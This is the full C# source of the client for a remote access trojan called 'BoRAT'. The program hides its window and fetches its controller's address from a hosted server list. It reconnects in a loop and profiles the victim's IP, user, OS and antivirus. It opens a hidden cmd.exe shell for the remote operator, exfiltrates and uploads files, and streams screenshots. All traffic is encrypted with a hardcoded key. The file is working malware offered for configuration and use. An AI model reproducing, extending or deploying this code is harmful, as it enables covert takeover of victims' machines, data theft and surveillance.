using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Security;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace BoRAT.Client
{
    public partial class frmMain : Form
    {
        // CHANGE THESE
        private readonly string serverList = "https://borat-admin.github.io/site/serverList.txt";
        private readonly string encryptionKey = "B0r@t2022!!";

        // Sockets
        private IPAddress _ip;
        private int _port, _delay;
        private Socket clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);

        // File Manager
        private bool isFileUpload { get; set; }
        private int fupSize;
        private string fdl_location = "";
        private string fup_location = "";
        private byte[] receivedFile = new byte[1];
        private int writeSize;

        // Remote Shell
        private bool isStarted;
        private StreamReader readOuput, errorOutput;
        private StreamWriter writeInput;

        // Remote Desktop
        private bool isRdpStop { get; set; }

        public frmMain()
        {
            InitializeComponent();
            GetConnectionInfo();
        }

        private void GetConnectionInfo()
        {
            try
            {
                using (var client = new WebClient())
                {
                    var s = client.DownloadString(serverList);

                    var list = s.Split(':');

                    _ip = IPAddress.Parse(list[0]);
                    _port = Convert.ToInt32(list[1]);
                    _delay = Convert.ToInt32(list[2]);

                    Console.WriteLine("\nServer responded!\nIP: " + _ip + "\nPort: " + _port + "\nDelay: " + _delay);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private void FrmMain_Shown(object sender, EventArgs e)
        {
            var coreThread = new Thread(StartConnection);
            coreThread.Start();
        }

        private void StartConnection()
        {
            try
            {
                while (true)
                    if (clientSocket.Connected)
                    {
                        Console.WriteLine("Connected to " + _ip + " on port " + _port);
                        ReceiveInfo();
                    }
                    else
                    {
                        MakeConnection();
                    }
            }
            catch (Exception ex)
            {
                Console.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private void ReceiveInfo()
        {
            try
            {
                var buffer = new byte[1024];
                var received = 0;

                try
                {
                    received = clientSocket.Receive(buffer);
                }
                catch (SocketException)
                {
                    clientSocket.Close();
                    clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                    MakeConnection();
                }

                if (received == 0)
                    return;

                var data = new byte[received];
                Array.Copy(buffer, data, received);

                if (isFileUpload) ProcessUploadRequest(data);

                if (!isFileUpload)
                    ProcessNormalRequest(data);
            }
            catch (Exception ex)
            {
                Console.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private void MakeConnection()
        {
            try
            {
                while (!clientSocket.Connected)
                    try
                    {
                        clientSocket.Connect(Dns.GetHostAddresses(Convert.ToString(_ip)), _port);

                        Thread.Sleep(_delay);
                    }
                    catch (SocketException)
                    {
                        // Run just in case IPs change
                        GetConnectionInfo();
                    }
            }
            catch (Exception ex)
            {
                Console.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private string GetPublicIPAddress()
        {
            try
            {
                var pubIP = new WebClient().DownloadString("https://api.ipify.org");
                return pubIP;
            }
            catch (Exception ex)
            {
                Console.WriteLine("INTERNAL ERROR:\n" + ex);
                return "N/A";
            }
        }

        private string GetUserName()
        {
            try
            {
                var userName = Environment.UserDomainName + @"\" + Environment.UserName;
                return userName;
            }
            catch (Exception ex)
            {
                Console.WriteLine("INTERNAL ERROR:\n" + ex);
                return "N/A";
            }
        }

        private string GetOSName()
        {
            try
            {
                string osName;
                var key = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows NT\\CurrentVersion");
                osName = (string)key.GetValue("productName");
                return osName;
            }
            catch (Exception ex)
            {
                Console.WriteLine("INTERNAL ERROR:\n" + ex);
                return "N/A";
            }
        }

        private string GetSecurityName()
        {
            try
            {
                var avName = "";
                try
                {
                    var windowsDefender = false;
                    var wmipathstr = @"\\" + Environment.MachineName + @"\root\SecurityCenter2";
                    var searcher = new ManagementObjectSearcher(wmipathstr, "SELECT * FROM AntivirusProduct");
                    var instances = searcher.Get();
                    avName = "";
                    foreach (var instance in instances)
                    {
                        if (instance.GetPropertyValue("displayName").ToString().Equals("Windows Defender"))
                            windowsDefender = true;
                        if (instance.GetPropertyValue("displayName").ToString() != "Windows Defender")
                            avName = instance.GetPropertyValue("displayName").ToString();
                    }

                    if (avName.Equals(string.Empty) && windowsDefender)
                        avName = "Windows Defender";
                    if (avName == "") avName = "N/A";
                }
                catch (Exception)
                {
                    avName = "N/A";
                }

                return avName;
            }
            catch (Exception ex)
            {
                Console.WriteLine("INTERNAL ERROR:\n" + ex);
                return "N/A";
            }
        }

        private string GetTimeDate()
        {
            try
            {
                var TimeDate = DateTime.Now.ToString();
                return TimeDate;
            }
            catch (Exception ex)
            {
                Console.WriteLine("INTERNAL ERROR:\n" + ex);
                return "N/A";
            }
        }

        private void ProcessNormalRequest(byte[] data)
        {
            try
            {
                var command = Encoding.Unicode.GetString(data);
                command = Decrypt(command);
                if (command.Contains("getInfo"))
                {
                    var id = command.Split('~')[1];
                    string information, pubIp, userName, osName, avName, timeDate;
                    pubIp = GetPublicIPAddress();
                    userName = GetUserName();
                    osName = GetOSName();
                    avName = GetSecurityName();
                    timeDate = GetTimeDate();

                    information = id + "~" + pubIp + "~" + userName +
                                  "~" + osName + "~" + avName + "~" +
                                  timeDate;
                    var sendInfo = "infoBack|" + information;

                    SendCommand(sendInfo);
                }

                else if (command.Equals("startcommand"))
                {
                    isStarted = true;

                    var pInfo = new ProcessStartInfo();
                    pInfo.FileName = "cmd.exe";
                    pInfo.CreateNoWindow = true;
                    pInfo.UseShellExecute = false;
                    pInfo.RedirectStandardInput = true;
                    pInfo.RedirectStandardOutput = true;
                    pInfo.RedirectStandardError = true;

                    var p = new Process();
                    p.StartInfo = pInfo;
                    p.Start();
                    writeInput = p.StandardInput;
                    readOuput = p.StandardOutput;
                    errorOutput = p.StandardError;
                    writeInput.AutoFlush = true;

                    var commandShellThread = new Thread(RuncommandShellCommands);
                    commandShellThread.Start();
                }

                else if (command.StartsWith("command§"))
                {
                    if (isStarted)
                    {
                        var strcommand = command.Split('§')[1];
                        writeInput.WriteLine(strcommand + "\r\n");
                    }

                    else
                    {
                        SendError("commandFailed\n");
                    }
                }

                else if (command.Equals("drivesList"))
                {
                    var dataToSend = "drivesList~";
                    var drivers = DriveInfo.GetDrives();

                    foreach (var d in drivers)
                        try
                        {
                            if (d.IsReady)
                                dataToSend += d.Name + "|" + d.TotalSize + "\n";
                            else
                                dataToSend += d.Name + "\n";
                        }

                        catch (UnauthorizedAccessException ex)
                        {
                            SendError("File Manager Error!\n" + ex.Message);
                        }

                        catch (IOException ex)
                        {
                            SendError("FileManager Error!\n" + ex.Message);
                        }

                    SendCommand(dataToSend);
                }

                else if (command.StartsWith("enterPath~"))
                {
                    var checkPath = false;
                    var path = command.Split('~')[1];

                    if (path.Length == 3 && path.Contains(":\\"))
                    {
                        checkPath = true;
                    }
                    else if (!checkPath && Directory.Exists(path))
                    {
                        checkPath = true;
                    }
                    else
                    {
                        SendError("Directory Not Found\n");
                        return;
                    }

                    var enterDir = new Thread(() => FM_EnterDirectory(path));
                    enterDir.Start();
                }

                else if (command.StartsWith("backPath~"))
                {
                    var path = command.Split('~')[1];

                    if (path.Length == 3 && path.Contains(":\\"))
                    {
                        SendCommand("backPath~driveList");
                    }
                    else
                    {
                        path = new DirectoryInfo(path).Parent.FullName;
                        SendCommand("backPath~" + path);
                    }
                }

                else if (command.StartsWith("fdl~"))
                {
                    var info = command.Split('~')[1];
                    if (File.Exists(info))
                    {
                        fdl_location = info;
                        try
                        {
                            var size = new FileInfo(info).Length.ToString();
                            SendCommand("fInfo~" + size);
                        }
                        catch (Exception ex)
                        {
                            SendError("Access Error!.\n" + ex.Message + "\n");
                        }
                    }
                    else
                    {
                        SendError("File Not Found\n");
                    }
                }

                else if (command.Equals("fdlConfirm"))
                {
                    try
                    {
                        var dataToSend = File.ReadAllBytes(fdl_location);
                        SendFile(dataToSend);
                    }
                    catch (Exception ex)
                    {
                        SendError("Access Error!.\n" + ex.Message + "\n");
                    }
                }

                else if (command.StartsWith("fup~"))
                {
                    fup_location = command.Split('~')[1];
                    if (!File.Exists(fup_location))
                    {
                        fupSize = int.Parse(command.Split('~')[2]);
                        receivedFile = new byte[fupSize];
                        SendCommand("fupConfirm");
                        isFileUpload = true;
                    }
                    else
                    {
                        SendError("File Already Exists.");
                    }
                }

                else if (command.Equals("rdpStart"))
                {
                    isRdpStop = false;
                    var rdpThread = new Thread(StreamScreen);
                    rdpThread.Start();
                }

                else if (command.Equals("rdpStop"))
                {
                    isRdpStop = true;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private void ProcessUploadRequest(byte[] data)
        {
            try
            {
                Buffer.BlockCopy(data, 0, receivedFile, writeSize, data.Length);

                writeSize += data.Length;

                if (receivedFile.Length == fupSize)
                {
                    try
                    {
                        using (var fs = File.Create(fup_location))
                        {
                            var info = receivedFile;
                            fs.Write(info, 0, info.Length);
                        }

                        Array.Clear(receivedFile, 0, receivedFile.Length);
                    }
                    catch (Exception ex)
                    {
                        SendError("File Upload Error!\n" + ex.Message + "\n");
                    }

                    SendCommand("fileReceived");
                    isFileUpload = false;
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private void SendCommand(string data)
        {
            try
            {
                var encrypt = Encrypt(data);
                var dataToSend = Encoding.Unicode.GetBytes(encrypt);
                clientSocket.Send(dataToSend);
            }
            catch (Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                MakeConnection();
            }
        }

        private void SendFile(byte[] data)
        {
            try
            {
                clientSocket.Send(data);
            }
            catch (Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                MakeConnection();
            }
        }

        private void SendImage(byte[] data)
        {
            try
            {
                var dataToSend = new byte[data.Length + 16];
                var header = Encoding.Unicode.GetBytes("rdpImage");
                Buffer.BlockCopy(header, 0, dataToSend, 0, header.Length);
                Buffer.BlockCopy(data, 0, dataToSend, header.Length, data.Length);

                clientSocket.Send(dataToSend, 0, dataToSend.Length, SocketFlags.None);
            }
            catch (Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                MakeConnection();
            }
        }

        private void SendError(string data)
        {
            try
            {
                var error = "error~" + data;
                var encrypt = Encrypt(error);
                var dataToSend = Encoding.Unicode.GetBytes(encrypt);
                clientSocket.Send(dataToSend);
            }
            catch (Exception)
            {
                clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                MakeConnection();
            }
        }

        private void RuncommandShellCommands()
        {
            try
            {
                string tmpData = "",
                    tmpError = "",
                    strData = "",
                    strError = "";

                while ((tmpData = readOuput.ReadLine()) != null)
                {
                    strData += tmpData + "\r";
                    //send command
                    SendCommand("commandout§" + strData);
                    strData = "";
                }

                while ((tmpError = errorOutput.ReadLine()) != null)
                {
                    strError += tmpError + "\r";
                    SendCommand("commandout§" + strError);
                    strError = "";
                }
            }

            catch (Exception ex)
            {
                SendError("command Error!\n" + ex.Message + "\n");
            }
        }

        private void FM_EnterDirectory(string path)
        {
            try
            {
                var directories = Directory.GetDirectories(path);
                var files = Directory.GetFiles(path);

                var dir = "";
                var file = "";

                foreach (var d in directories)
                {
                    var size = "N/A";
                    var name = d.Replace(path, "");
                    var creationTime = Directory.GetCreationTime(path).ToString();
                    var info = name + "|" + size + "|" + creationTime + "|" + d;
                    dir += info + "\n";
                }

                foreach (var f in files)
                {
                    var size = new FileInfo(f).Length.ToString();
                    var name = Path.GetFileName(f);
                    var creationTime = File.GetCreationTime(f).ToString();
                    var info = name + "|" + size + "|" + creationTime + "|" + f;
                    file += info + "\n";
                }

                var dataToSend = "enterPath~" + dir + file;

                SendCommand(dataToSend);
            }
            catch (ArgumentNullException)
            {
                SendError("Error in EnterPath\n");
            }
            catch (SecurityException)
            {
                SendError("Security Error in EnterPath\n");
            }
            catch (ArgumentException)
            {
                SendError("Error in EnterPath\n");
            }
            catch (UnauthorizedAccessException)
            {
                SendError("Unauthorized Error in EnterPath\n");
            }
            catch (PathTooLongException)
            {
                SendError("Error in EnterPath.\nTry Enter With command Shell\n");
            }
            catch (NotSupportedException)
            {
                SendError("Unknown Error in EnterPath\n");
            }
        }

        private void StreamScreen()
        {
            try
            {
                while (!isRdpStop)
                {
                    var imgConverter = new ImageConverter();
                    var image = (byte[])imgConverter.ConvertTo(DesktopScreen(), typeof(byte[]));
                    SendImage(image);
                    Thread.Sleep(1000);
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine("INTERNAL ERROR:\n" + ex);
            }
        }

        private void FrmMain_Load(object sender, EventArgs e)
        {
            Hide();
        }

        private Bitmap DesktopScreen()
        {
            try
            {
                var bounds = Screen.PrimaryScreen.Bounds;
                var screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
                var graph = Graphics.FromImage(screenshot);
                graph.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
                return screenshot;
            }
            catch (Exception)
            {
                return null;
            }
        }

        public string Encrypt(string clearText)
        {
            var clearBytes = Encoding.Unicode.GetBytes(clearText);
            using (var encryptor = Rijndael.Create())
            {
                var pdb = new Rfc2898DeriveBytes(encryptionKey,
                    new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                encryptor.Key = pdb.GetBytes(32);
                encryptor.IV = pdb.GetBytes(16);

                using (var ms = new MemoryStream())
                {
                    using (var cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                    {
                        cs.Write(clearBytes, 0, clearBytes.Length);
                        cs.Close();
                    }

                    clearText = Convert.ToBase64String(ms.ToArray());
                }
            }

            return clearText;
        }

        public string Decrypt(string cipherText)
        {
            try
            {
                var cipherBytes = Convert.FromBase64String(cipherText);
                using (var encryptor = Rijndael.Create())
                {
                    var pdb = new Rfc2898DeriveBytes(encryptionKey,
                        new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (var ms = new MemoryStream())
                    {
                        using (var cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }

                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }

                return cipherText;
            }
            catch (Exception)
            {
                //plain text?
                return cipherText;
            }
        }
    }
}